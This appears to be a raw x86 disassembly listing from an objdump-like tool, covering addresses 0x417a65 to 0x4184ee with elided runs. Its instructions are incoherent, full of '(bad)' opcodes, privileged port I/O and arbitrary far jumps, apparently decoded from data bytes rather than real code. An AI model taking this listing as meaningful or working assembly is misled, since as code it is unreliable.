  417a65:	fidivr WORD PTR [ebx+0x32e1546c]
  417a6b:	mov    eax,0xf3a5165c
  417a70:	sete   BYTE PTR [ecx]
  417a73:	inc    eax
  417a74:	mov    ds:0x8f0b2988,eax
  417a79:	dec    ebp
  417a7a:	sbb    eax,0x3dab38e1
  417a7f:	mov    WORD PTR [eax-0x34ad4a93],gs
  417a85:	cmp    ch,BYTE PTR [eax-0x2ab4e0d7]
  417a8b:	ret    0x7a7b
  417a8e:	outs   dx,DWORD PTR ds:[esi]
  417a8f:	clc    
	...
  417af4:	das    
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x26ac234e]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	scas   al,BYTE PTR es:[edi]
  417b0d:	fadd   QWORD PTR [edx-0x4e414da9]
  417b13:	xor    ecx,0x51
  417b16:	clc    
  417b17:	jo     0x417b28
  417b19:	cli    
  417b1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b1b:	fidivr DWORD PTR [eax-0x3]
  417b1e:	not    BYTE PTR [ebp-0x80]
  417b21:	test   al,0x98
  417b23:	sbb    DWORD PTR [ebx-0x6d],esp
  417b26:	dec    esp
  417b27:	add    DWORD PTR [ecx-0x38a855a6],0x62
  417b2e:	push   es
  417b2f:	in     eax,dx
  417b30:	sub    DWORD PTR [ebp-0x14abcbdb],edx
  417b36:	or     al,0x4d
  417b38:	mov    bh,0xeb
  417b3a:	jbe    0x417b57
  417b3c:	in     al,0xc7
  417b3e:	xchg   DWORD PTR [eax+ebp*1-0x41325591],eax
  417b45:	xor    eax,0xb0fd6fd8
  417b4a:	xchg   ebp,eax
  417b4b:	xchg   ebp,eax
  417b4c:	test   eax,0x16cb1b18
  417b51:	loopne 0x417b2c
  417b53:	pop    ecx
  417b54:	call   0x462f:0x77f2488
  417b5b:	cld    
  417b5c:	fcomp  DWORD PTR [edi-0x75]
  417b5f:	dec    eax
  417b60:	jmp    0x2c30:0x31c97dd8
  417b67:	xchg   esi,eax
  417b68:	mov    DWORD PTR [esi-0xd],ebp
  417b6b:	mul    DWORD PTR [ecx]
  417b6d:	sbb    eax,0xeb4193e2
  417b72:	adc    ah,ch
  417b74:	pushf  
  417b75:	inc    ecx
  417b76:	stos   DWORD PTR es:[edi],eax
  417b77:	dec    ecx
  417b78:	add    BYTE PTR [ebx],dl
  417b7a:	imul   esp,esp,0xffffffb5
  417b7d:	mov    edi,0x14620584
  417b82:	push   es
  417b83:	aaa    
  417b84:	cmp    ebx,DWORD PTR [esi]
  417b86:	rcl    DWORD PTR ds:0xb1d2e447,0x7
  417b8d:	jge    0x417bd9
  417b8f:	sbb    bl,BYTE PTR [eax-0x26]
  417b92:	test   eax,0x38878da8
  417b97:	xor    ch,ah
  417b99:	inc    edx
  417b9a:	xor    eax,esi
  417b9c:	dec    esi
  417b9d:	xchg   edx,eax
  417b9e:	cmp    eax,DWORD PTR [ecx]
  417ba0:	js     0x417c0d
  417ba2:	jl     0x417b5c
  417ba4:	addr16 sbb dh,cl
  417ba7:	adc    eax,0x13721919
  417bac:	inc    ecx
  417bad:	lds    ecx,FWORD PTR [eax+eiz*2-0x22]
  417bb1:	in     al,0x4b
  417bb3:	push   ebp
  417bb4:	es inc esi
  417bb6:	cmp    BYTE PTR es:[edx+edx*1],ch
  417bba:	add    al,0x1
  417bbc:	outs   dx,BYTE PTR ds:[esi]
  417bbd:	fstp   TBYTE PTR [edi-0x345fb344]
  417bc3:	fnstcw WORD PTR [ebp-0x2c]
  417bc6:	leave  
  417bc7:	repnz push cs
  417bc9:	imul   edx,edi,0x1e
  417bcc:	sbb    eax,0x35a82861
  417bd1:	pop    esp
  417bd2:	pop    esi
  417bd3:	cmp    al,0x98
  417bd5:	and    DWORD PTR [ebp-0x555a0dd2],esi
  417bdb:	mov    ebx,esp
  417bdd:	adc    al,0x11
  417bdf:	or     esi,DWORD PTR [eax+ebx*4+0x2bcb9944]
  417be6:	repnz cmp DWORD PTR [ecx],edi
  417be9:	sbb    BYTE PTR [edi],ah
  417beb:	(bad)  
  417bec:	mov    esi,esi
  417bee:	xchg   DWORD PTR [edi+0x0],ecx
  417bf1:	cdq    
  417bf2:	repz repz pop esp
  417bf5:	or     bl,BYTE PTR [edx+0x60c2f103]
  417bfb:	les    eax,FWORD PTR [eax-0x44a173d0]
  417c01:	xor    ecx,ecx
  417c03:	hlt    
  417c04:	and    ebp,DWORD PTR [edi-0x4c]
  417c07:	jmp    0x417bb6
  417c09:	addr16 pop ss
  417c0b:	inc    edi
  417c0c:	popf   
  417c0d:	push   ebp
  417c0e:	shr    esi,0x0
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x59
  417c81:	fimul  WORD PTR [ebp+0x68]
  417c84:	cmp    bl,0x0
  417c87:	add    BYTE PTR [ecx+eax*1],al
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	ins    BYTE PTR es:[edi],dx
  417c8d:	addr16 jle 0x417c2c
  417c90:	inc    ecx
  417c91:	mov    ecx,0x17e33115
  417c96:	jl     0x417cf5
  417c98:	fidivr DWORD PTR [eax+ecx*1+0x4e]
  417c9c:	jno    0x417d01
  417c9e:	dec    edi
  417c9f:	mov    ebx,0x72ffd79b
  417ca4:	jmp    0x417c87
  417ca6:	push   edi
  417ca7:	(bad)  
  417ca8:	lock adc bh,ah
  417cab:	inc    esi
  417cac:	sbb    eax,0x898358d6
  417cb1:	xor    ch,BYTE PTR [ebx-0x34]
  417cb4:	daa    
  417cb5:	mov    esi,0xbb50a9d8
  417cba:	pop    es
  417cbb:	call   0xc84a:0x53f9f71c
  417cc2:	addr16 sub bh,dh
  417cc5:	and    DWORD PTR [edi+0x7c],0x6f
  417cc9:	adc    esi,edi
  417ccb:	mov    ebp,0x570b42fb
  417cd0:	adc    al,0x63
  417cd2:	inc    ebp
  417cd3:	cmp    DWORD PTR [ebx+0x31f80298],eax
  417cd9:	stos   DWORD PTR es:[edi],eax
  417cda:	retfw  0x86ca
  417cde:	out    dx,eax
  417cdf:	cwde   
  417ce0:	or     eax,0x5b332d11
  417ce5:	sub    ecx,edx
  417ce7:	leave  
  417ce8:	into   
  417ce9:	sbb    BYTE PTR [edx+eax*1],al
  417cec:	shl    esi,0xb9
  417cef:	lea    esi,[ebx-0x22687092]
  417cf5:	test   DWORD PTR [esi+eiz*8-0x20],ecx
  417cf9:	inc    esp
  417cfa:	in     eax,dx
  417cfb:	das    
  417cfc:	push   0x5e67b34b
  417d01:	repnz xor DWORD PTR ds:[edi],0x9afb8d27
  417d09:	lds    ebx,FWORD PTR [ebp+0x4dd7f9cc]
  417d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d10:	inc    esp
  417d11:	mov    eax,DWORD PTR [ecx+0x6631f498]
  417d17:	fwait
  417d18:	stos   DWORD PTR es:[edi],eax
  417d19:	pushf  
  417d1a:	fdiv   st(0),st
  417d1c:	xor    al,0xb
  417d1e:	xchg   edi,eax
  417d1f:	(bad)  
  417d20:	repz pop ecx
  417d22:	and    al,0x69
  417d24:	jge    0x417d3a
  417d26:	dec    edi
  417d27:	jns    0x417cfe
  417d29:	call   0x2788:0x87daf622
  417d30:	mov    al,0xee
  417d32:	add    al,0x49
  417d34:	neg    BYTE PTR [edx]
  417d36:	adc    eax,0x500692ac
  417d3b:	(bad)  
  417d3c:	int3   
  417d3d:	and    eax,0xefc15074
  417d42:	(bad)  
  417d43:	mov    DWORD PTR [edi],eax
  417d45:	jge    0x417d93
  417d47:	jge    0x417da9
  417d49:	sti    
  417d4a:	xchg   DWORD PTR [ecx-0x303c460],ecx
  417d50:	stos   DWORD PTR es:[edi],eax
  417d51:	cs ss or eax,0xcb841d8c
  417d58:	add    BYTE PTR [ecx-0x21bb0e40],cl
  417d5e:	lds    ebp,FWORD PTR [ebx-0x4e]
  417d61:	cmp    edi,DWORD PTR [ebp+0x58a26a9d]
  417d67:	pop    edx
  417d68:	mov    eax,0x4f1c3237
  417d6d:	mov    al,0x29
  417d6f:	push   edi
  417d70:	in     al,dx
  417d71:	(bad)  
  417d72:	imul   BYTE PTR [ebp-0x3a]
  417d75:	test   DWORD PTR [ebp+ebx*8+0x6e5fd809],0x87f15469
  417d80:	inc    ecx
  417d81:	mov    es,WORD PTR [ecx]
  417d83:	cmp    al,BYTE PTR [esi-0x33b7cb9b]
  417d89:	cmc    
  417d8a:	mov    WORD PTR [edi-0x5],es
  417d8d:	das    
  417d8e:	std    
  417d8f:	mov    cl,0x0
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e01:	mov    bl,0xa9
  417e03:	jge    0x417d89
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	call   0x6239:0x4f49347f
  417e13:	jecxz  0x417de9
  417e15:	mov    ds:0x2a9f5010,al
  417e1a:	or     DWORD PTR [ecx],edi
  417e1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e1d:	jmp    0xb8ea8673
  417e22:	pop    edi
  417e23:	dec    ebp
  417e24:	test   al,0xee
  417e26:	addr16 jmp 0x5903183a
  417e2c:	cli    
  417e2d:	mov    BYTE PTR [ecx-0x35d17aed],bl
  417e33:	sti    
  417e34:	and    eax,0xfff9204d
  417e39:	mov    WORD PTR [ebx-0x3b2630f1],ds
  417e3f:	stc    
  417e40:	in     eax,0xe2
  417e42:	rol    edx,0x46
  417e45:	hlt    
  417e46:	sti    
  417e47:	jne    0x417dda
  417e49:	or     eax,0x31730e1b
  417e4e:	imul   ebp,DWORD PTR [ebx],0x2bf9ec3a
  417e54:	jmp    0x417e37
  417e56:	mov    dh,0xef
  417e58:	adc    ebx,ecx
  417e5a:	xchg   ecx,eax
  417e5b:	adc    al,0xed
  417e5d:	repnz pop edx
  417e5f:	xchg   esi,eax
  417e60:	or     eax,0x84d3830f
  417e65:	lahf   
  417e66:	pop    edi
  417e67:	xchg   ebx,eax
  417e68:	mul    al
  417e6a:	xchg   ebx,eax
  417e6b:	xchg   DWORD PTR [esi-0x5b],edx
  417e6e:	sub    eax,0xb7b06292
  417e73:	xor    esp,DWORD PTR [ebx]
  417e75:	cmp    eax,0x136febf4
  417e7a:	sbb    al,0x85
  417e7c:	sub    al,dl
  417e7e:	sti    
  417e7f:	mov    dl,0xfa
  417e81:	and    DWORD PTR [ecx],edi
  417e83:	dec    esi
  417e84:	sbb    al,0x86
  417e86:	loopne 0x417e43
  417e88:	shr    DWORD PTR [ecx+0x7bcc5521],0xe8
  417e8f:	lahf   
  417e90:	dec    ebp
  417e91:	dec    eax
  417e92:	add    BYTE PTR [ecx+0x155c8872],al
  417e98:	leave  
  417e99:	bound  ebx,QWORD PTR [edi]
  417e9b:	mov    al,ds:0x549ea9e2
  417ea0:	push   0x17
  417ea2:	mov    ds:0xde1c85a,al
  417ea7:	in     al,0xe
  417ea9:	mov    ebx,0x6ec7f46d
  417eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eaf:	mov    dl,BYTE PTR [ebx-0x37db33c9]
  417eb5:	imul   edi,DWORD PTR [eax-0x34],0xffffffa0
  417eb9:	push   edx
  417eba:	scas   al,BYTE PTR es:[edi]
  417ebb:	not    DWORD PTR [ebx-0x5ce9c8dd]
  417ec1:	mov    ebx,0x22825cf9
  417ec6:	mov    al,0x10
  417ec8:	aam    0xd6
  417eca:	aam    0x8a
  417ecc:	leave  
  417ecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ece:	push   ebp
  417ecf:	dec    edx
  417ed0:	imul   ecx,DWORD PTR [ebx],0xffffffcc
  417ed3:	popa   
  417ed4:	xor    ah,BYTE PTR [ebx+0x42]
  417ed7:	mov    bl,0xe7
  417ed9:	aas    
  417eda:	sbb    al,0xde
  417edc:	mov    al,0xdb
  417ede:	push   ds
  417edf:	in     eax,dx
  417ee0:	and    cl,BYTE PTR [ebx]
  417ee2:	inc    ebx
  417ee3:	mov    al,0xc3
  417ee5:	xchg   esp,eax
  417ee6:	cmp    esi,DWORD PTR ds:0xda40ec16
  417eec:	stos   BYTE PTR es:[edi],al
  417eed:	mov    edx,0x6bcbec79
  417ef2:	xor    eax,ebp
  417ef4:	push   0xffffff81
  417ef6:	mov    ch,0xa
  417ef8:	mov    eax,0xf7be5548
  417efd:	jge    0x417eef
  417eff:	add    dl,BYTE PTR [ebx+0x982c814]
  417f05:	adc    al,0x36
  417f07:	jne    0x417f6d
  417f09:	sub    al,0xc5
  417f0b:	(bad)  
  417f0c:	sahf   
  417f0d:	fsubrp st(1),st
  417f0f:	fld    QWORD PTR [eax]
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	cs loope 0x417f85
  417f83:	outs   dx,DWORD PTR ds:[esi]
  417f84:	mov    ch,bh
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    al,0x1
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	stos   BYTE PTR es:[edi],al
  417f8d:	dec    esp
  417f8e:	mov    edi,0x5d5cdeb6
  417f93:	outs   dx,BYTE PTR ds:[esi]
  417f94:	pop    es
  417f95:	and    eax,0x94960a91
  417f9a:	ret    
  417f9b:	xchg   eax,edx
  417f9d:	jle    0x417f42
  417f9f:	inc    ebx
  417fa0:	dec    ebx
  417fa1:	mov    ch,0xed
  417fa3:	cmp    ebp,DWORD PTR ds:0x7e99645f
  417fa9:	clc    
  417faa:	cmp    BYTE PTR [edx+0x59447bc6],0xbf
  417fb1:	adc    DWORD PTR ds:0x3e9bc484,esp
  417fb7:	add    edx,ebx
  417fb9:	fdiv   QWORD PTR [edx]
  417fbb:	adc    bh,dh
  417fbd:	mov    ecx,esi
  417fbf:	dec    esi
  417fc0:	bound  eax,QWORD PTR [edi-0x58]
  417fc3:	push   ecx
  417fc4:	push   ebp
  417fc5:	gs ja  0x417f81
  417fc8:	adc    eax,0xbd77ca58
  417fcd:	lods   al,BYTE PTR ds:[esi]
  417fce:	dec    edx
  417fcf:	fadd   QWORD PTR [edx]
  417fd1:	push   eax
  417fd2:	out    0xf0,al
  417fd4:	mov    cl,0x63
  417fd6:	and    BYTE PTR [ecx-0x55],bh
  417fd9:	adc    edx,DWORD PTR [ebx]
  417fdb:	test   al,0x7
  417fdd:	in     al,0x35
  417fdf:	adc    al,0x6b
  417fe1:	cwde   
  417fe2:	or     BYTE PTR [edi+0x2a277ef8],bh
  417fe8:	mov    bl,0x4d
  417fea:	(bad)
  417fed:	and    eax,0x1753d671
  417ff2:	inc    esp
  417ff3:	and    BYTE PTR [ebp-0x2301a0a9],0xe
  417ffa:	in     al,dx
  417ffb:	mov    edx,0xc3e45935
  418000:	add    eax,0x1d4dc20c
  418005:	lds    eax,FWORD PTR [edx-0x4]
  418008:	ror    DWORD PTR [esi+eax*8+0x5eb3499b],1
  41800f:	fdivp  st(1),st
  418011:	pop    ecx
  418012:	mov    eax,DWORD PTR [ebx+0x17c7d336]
  418018:	mov    ds,WORD PTR [edi+0x76f37944]
  41801e:	mov    dl,0xd
  418020:	dec    edi
  418021:	sbb    edi,DWORD PTR [eax+0x54]
  418024:	les    dx,DWORD PTR [ebp+0x2c]
  418028:	pop    esp
  418029:	retf   
  41802a:	mov    eax,ds:0xbd16b055
  41802f:	mov    ?,WORD PTR [ebp-0x1a]
  418032:	cli    
  418033:	add    eax,0xa6c97591
  418038:	in     al,dx
  418039:	lods   eax,DWORD PTR ds:[esi]
  41803a:	mov    WORD PTR [eax-0x5aaeaf4b],cs
  418040:	(bad)  
  418041:	xchg   edx,eax
  418042:	mov    edx,0x68e312ac
  418047:	push   edx
  418048:	push   eax
  418049:	mov    cl,0xe3
  41804b:	xchg   edi,eax
  41804c:	sub    BYTE PTR [ebp+0xbf00520],0x32
  418053:	add    al,0x73
  418055:	fstp   QWORD PTR [esi*4-0x6b7f864c]
  41805c:	mov    esp,0xa02a8bc9
  418061:	sbb    eax,0x13c164ce
  418066:	ins    BYTE PTR es:[edi],dx
  418067:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418068:	jmp    0x41801c
  41806a:	push   0x31
  41806c:	daa    
  41806d:	dec    ebx
  41806e:	ja     0x418038
  418070:	outs   dx,BYTE PTR ds:[esi]
  418071:	jecxz  0x418048
  418073:	popf   
  418074:	xchg   ebx,eax
  418075:	cmp    BYTE PTR [edx+0x714054d],0x7c
  41807c:	fbstp  TBYTE PTR [eax+0x0]
  41807f:	daa    
  418080:	push   esp
  418081:	and    al,bh
  418083:	pop    ebp
  418084:	fwait
  418085:	call   DWORD PTR [eax-0x40]
  418088:	or     dl,BYTE PTR [eax]
  41808a:	mov    DWORD PTR [edi+0x2e],eax
  41808d:	mov    cl,0x49
  41808f:	add    DWORD PTR [eax],0x0
	...
  4180f2:	add    BYTE PTR [eax],al
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x7a2fdebc,eax
  418101:	xchg   DWORD PTR [ecx-0x61],eax
  418104:	mov    esi,?
  418106:	add    BYTE PTR [eax],al
  418108:	add    al,0x1
  41810a:	add    BYTE PTR [eax],al
  41810c:	nop
  41810d:	xchg   ebp,eax
  41810e:	mov    ebx,0xe803aa18
  418113:	pop    esp
  418114:	sbb    BYTE PTR [esi-0x3b],0x3e
  418118:	push   0xbb7ebf95
  41811d:	test   al,0x8b
  41811f:	adc    BYTE PTR [ebx-0x2599ae8d],0xc6
  418126:	frstor [ecx-0x41eedb66]
  41812c:	cwde   
  41812d:	pop    ebx
  41812e:	mov    edx,0xace8cb5f
  418133:	aad    0xff
  418135:	into   
  418136:	(bad)  
  418137:	xor    al,0xeb
  418139:	jb     0x41810f
  41813b:	pop    edi
  41813c:	fcomi  st,st(7)
  41813e:	and    ah,ch
  418140:	push   ebp
  418141:	dec    ebx
  418142:	xor    esi,ebp
  418144:	rcr    BYTE PTR [ebx-0x54f044a5],cl
  41814a:	inc    ebx
  41814b:	gs popf 
  41814d:	sub    cl,bl
  41814f:	imul   esi,ebx,0x22
  418152:	aas    
  418153:	pop    esp
  418154:	cs pop ecx
  418156:	outs   dx,BYTE PTR ds:[esi]
  418157:	rcl    BYTE PTR [edi],1
  418159:	js     0x4181d0
  41815b:	hlt    
  41815c:	xor    eax,0x4ed5afee
  418161:	stos   BYTE PTR es:[edi],al
  418162:	mov    edx,0xfabcb4ce
  418167:	or     al,0x7d
  418169:	add    bh,BYTE PTR [esi]
  41816b:	pushf  
  41816c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41816d:	push   cs
  41816e:	jbe    0x418114
  418170:	mov    ah,0x68
  418172:	jmp    0xf5c6:0xabbce3db
  418179:	cwde   
  41817a:	(bad)  
  41817b:	pop    esi
  41817c:	or     bl,BYTE PTR [edi-0x7]
  41817f:	mov    eax,ds:0x9fa9f4e6
  418184:	push   eax
  418185:	sti    
  418186:	out    dx,eax
  418187:	xor    BYTE PTR [ecx],0x42
  41818a:	call   0xac6f713f
  41818f:	leave  
  418190:	in     eax,0x10
  418192:	js     0x4181f1
  418194:	daa    
  418195:	out    dx,eax
  418196:	shl    DWORD PTR ds:0x9f0f51c7,0xe5
  41819d:	mov    eax,ds:0xb04c3036
  4181a2:	adc    al,0x31
  4181a4:	mov    edi,0x65fa046f
  4181a9:	fdivr  DWORD PTR [esi]
  4181ab:	jo     0x41814a
  4181ad:	imul   edx,DWORD PTR [ebp-0x6a],0x5e2e48dd
  4181b4:	mov    al,0x6d
  4181b6:	xor    eax,0xa34ae4ea
  4181bb:	iret   
  4181bc:	sub    bl,0xe5
  4181bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181c0:	sbb    ebp,DWORD PTR [ebx]
  4181c2:	xchg   ebp,eax
  4181c3:	outs   dx,BYTE PTR ds:[esi]
  4181c4:	push   edi
  4181c5:	mov    WORD PTR [eax+ecx*8-0x17],?
  4181c9:	(bad)  
  4181ca:	je     0x418165
  4181cc:	inc    ebx
  4181cd:	cmp    edx,DWORD PTR [esi-0xf]
  4181d0:	xor    al,0x86
  4181d2:	hlt    
  4181d3:	enter  0xa1fd,0xc0
  4181d7:	hlt    
  4181d8:	test   esp,edx
  4181da:	inc    esp
  4181db:	sbb    eax,0xe32a783c
  4181e0:	int    0x93
  4181e2:	ss ja  0x4181bb
  4181e5:	aam    0x97
  4181e7:	mov    esi,0x935d3d9d
  4181ec:	repz gs push edi
  4181ef:	test   dh,ah
  4181f1:	mov    BYTE PTR [edi-0xf],cl
  4181f4:	frstor [esi+eiz*1-0x29e6101]
  4181fb:	call   0x4d85:0x52a13ca7
  418202:	imul   edx,DWORD PTR [ebx-0x6c],0xe0f08c62
  418209:	loopne 0x41818b
  41820b:	mov    fs,WORD PTR [edx]
  41820d:	sbb    BYTE PTR ds:[ebx],ch
	...
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x1bcfb8d6
  418282:	sar    DWORD PTR [esi],1
  418284:	nop
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR [ecx+eax*1],al
  41828a:	add    BYTE PTR [eax],al
  41828c:	dec    eax
  41828d:	mov    ebx,0x3e9ead0
  418292:	pusha  
  418293:	pop    ebp
  418294:	into   
  418295:	adc    BYTE PTR [esi],al
  418297:	(bad)
  41829a:	xchg   edx,eax
  41829b:	cmp    edi,DWORD PTR [ebx]
  41829d:	lahf   
  41829e:	add    dl,BYTE PTR [edi+0x190583a4]
  4182a4:	std    
  4182a5:	inc    eax
  4182a6:	fs in  eax,0xc2
  4182a9:	pop    esp
  4182aa:	add    BYTE PTR [ebx],cl
  4182ac:	popf   
  4182ad:	ret    
  4182ae:	inc    esp
  4182af:	jge    0x4182a8
  4182b1:	test   al,0x24
  4182b3:	cmp    ah,BYTE PTR [esi-0x7b]
  4182b6:	jbe    0x418287
  4182b8:	addr16 cwde 
  4182ba:	mov    BYTE PTR [esi],bh
  4182bc:	inc    ecx
  4182bd:	(bad)  
  4182be:	cmc    
  4182bf:	jmp    0x41831e
  4182c1:	mov    eax,0x580add8d
  4182c6:	mov    ds:0xc4fe54fd,al
  4182cb:	(bad)  
  4182cc:	dec    edx
  4182cd:	cmp    BYTE PTR [esp+edx*4],0x50
  4182d1:	(bad)  
  4182d2:	xlat   BYTE PTR ds:[ebx]
  4182d3:	out    0x6d,al
  4182d5:	ret    
  4182d6:	fbld   TBYTE PTR [ecx]
  4182d8:	and    al,0x8b
  4182da:	dec    edi
  4182db:	xchg   BYTE PTR [eax-0x35848feb],al
  4182e1:	sbb    BYTE PTR cs:[esi-0x2f],ch
  4182e5:	mov    eax,ds:0x2f48f564
  4182ea:	inc    edi
  4182eb:	(bad)
  4182f0:	adc    ebx,DWORD PTR [eax-0x21]
  4182f3:	sub    al,BYTE PTR [eax]
  4182f5:	and    eax,0x997b8447
  4182fa:	jecxz  0x41832b
  4182fc:	cdq    
  4182fd:	jne    0x4182e0
  4182ff:	push   ebx
  418300:	mov    al,0xe2
  418302:	dec    eax
  418303:	jecxz  0x4182a4
  418305:	es push esp
  418307:	(bad)  
  418308:	adc    BYTE PTR [ecx+0x139b7220],bl
  41830e:	mov    bh,0x5f
  418310:	out    dx,eax
  418311:	fsub   DWORD PTR [eax]
  418313:	adc    ecx,DWORD PTR [ecx-0x6c]
  418316:	out    dx,eax
  418317:	out    0xee,eax
  418319:	and    BYTE PTR [ebx+0x6997ad1c],0xf7
  418320:	mov    dh,0xc5
  418322:	or     DWORD PTR [eax-0x61],edx
  418325:	shl    DWORD PTR [edi+0x74],0x48
  418329:	into   
  41832a:	idiv   DWORD PTR [esi]
  41832c:	pusha  
  41832d:	enter  0xba64,0xce
  418331:	(bad)  
  418332:	fistp  QWORD PTR cs:[eax+0x3d]
  418336:	inc    edx
  418337:	and    dh,BYTE PTR [ecx]
  418339:	addr16 xchg ebx,eax
  41833b:	sub    ecx,DWORD PTR [ecx-0x3]
  41833e:	out    dx,al
  41833f:	adc    eax,eax
  418341:	inc    ebx
  418342:	mov    ah,0x23
  418344:	clc    
  418345:	inc    edx
  418346:	adc    al,BYTE PTR [edi+edi*8-0x52eadc52]
  41834d:	gs aam 0xbe
  418350:	sbb    ebp,DWORD PTR [ebp-0x5800283a]
  418356:	daa    
  418357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418358:	neg    dh
  41835a:	std    
  41835b:	or     BYTE PTR gs:[esi+0x7b],ah
  41835f:	xor    eax,0x81ce610e
  418364:	in     al,dx
  418365:	enter  0xfbac,0x1b
  418369:	push   0xb252525d
  41836e:	cmc    
  41836f:	lods   al,BYTE PTR ds:[esi]
  418370:	pushf  
  418371:	repz aam 0x8e
  418374:	call   0x5d1941d7
  418379:	adc    BYTE PTR [ecx+0x1c],dh
  41837c:	jae    0x4183f3
  41837e:	mov    dh,0xc0
  418380:	gs push ds
  418382:	rcl    DWORD PTR [ecx],cl
  418384:	sbb    al,al
  418386:	jb     0x4183f9
  418388:	push   cs
  418389:	push   ebx
  41838a:	xchg   BYTE PTR [esi+edi*8-0x5f],dh
  41838e:	je     0x41833d
	...
  4183f4:	fdiv   QWORD PTR [ebx-0x2380afc1]
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	ret    0x68cc
  418403:	mov    ds:0x10094,al
  418408:	add    al,0x1
  41840a:	add    BYTE PTR [eax],al
  41840c:	gs aad 0xf2
  41840f:	test   eax,0x881dca36
  418414:	lock jbe 0x4183e3
  418417:	call   0x10187752
  41841c:	fist   WORD PTR [eax]
  41841e:	dec    ebx
  41841f:	mov    BYTE PTR [ecx+0x3320a42c],cl
  418425:	in     al,0xb7
  418427:	push   ecx
  418428:	iret   
  418429:	jae    0x418413
  41842b:	test   edx,esi
  41842d:	shl    DWORD PTR [eax-0x44],0x5e
  418431:	mov    edi,0xace6c3b4
  418436:	adc    DWORD PTR [edx],0xffffff98
  418439:	xchg   ah,dh
  41843b:	adc    DWORD PTR [ecx-0x52],ecx
  41843e:	jno    0x4183e8
  418440:	and    al,0x9a
  418442:	mov    esp,0x901e7de8
  418447:	mov    dl,0x7a
  418449:	(bad)  
  41844a:	call   0xa8ea629a
  41844f:	popa   
  418450:	pop    ebp
  418451:	jns    0x4183fd
  418453:	mov    esi,esp
  418455:	call   0x639d63e8
  41845a:	push   ecx
  41845b:	aas    
  41845c:	inc    edi
  41845d:	push   ebp
  41845e:	mov    cl,0xfb
  418460:	arpl   WORD PTR [esi+0x4],bp
  418463:	mov    cl,0x7d
  418465:	adc    esi,DWORD PTR [eax+0x1537a6c6]
  41846b:	cwde   
  41846c:	jo     0x41848c
  41846e:	pop    esp
  41846f:	sbb    eax,0xe9a1a434
  418474:	stc    
  418475:	(bad)
  418478:	dec    eax
  418479:	rcr    DWORD PTR [ebx],cl
  41847b:	inc    edi
  41847c:	or     eax,0xc6dff1e7
  418481:	mov    eax,ds:0x337bfc76
  418486:	fwait
  418487:	mov    ds:0x80ef3bfa,eax
  41848c:	and    al,0x0
  41848e:	cmovb  ebx,DWORD PTR [edi]
  418491:	into   
  418492:	sbb    eax,0xe9379b67
  418497:	add    ah,BYTE PTR [ecx+eax*2]
  41849a:	pop    edx
  41849b:	push   ss
  41849c:	mov    al,ds:0x7db41936
  4184a1:	bound  edx,QWORD PTR [ecx-0x57]
  4184a4:	clc    
  4184a5:	dec    ecx
  4184a6:	fist   WORD PTR [edi]
  4184a8:	(bad)  
  4184a9:	in     al,0xfd
  4184ab:	ret    0xbeae
  4184ae:	cs retf 
  4184b0:	add    dl,BYTE PTR [eax+0x4c7927fc]
  4184b6:	adc    al,0x4f
  4184b8:	(bad)  
  4184b9:	pop    ds
  4184ba:	imul   eax,DWORD PTR [ebx-0x75],0x7f3eb064
  4184c1:	jo     0x4184ee
  4184c3:	add    DWORD PTR [eax-0x6d],eax
  4184c6:	jae    0x4184b7
  4184c8:	xchg   ebx,eax
  4184c9:	js     0x41850f
  4184cb:	xchg   ebx,eax
  4184cc:	xor    BYTE PTR [edi],ch
  4184ce:	and    BYTE PTR [edi+edx*8+0x69],bl
  4184d2:	shr    DWORD PTR [ebx+0x79],0xce
  4184d6:	jae    0x4184c9
  4184d8:	push   ss
  4184d9:	addr16 push eax
  4184db:	and    dh,dl
  4184dd:	cmp    eax,0xc8ae8b60
  4184e2:	repz lds eax,FWORD PTR [esi+0x1c]
  4184e6:	or     DWORD PTR [eax],0xcb019f95
  4184ec:	stos   DWORD PTR es:[edi],eax
  4184ed:	stc    
  4184ee:	adc    al,0x58
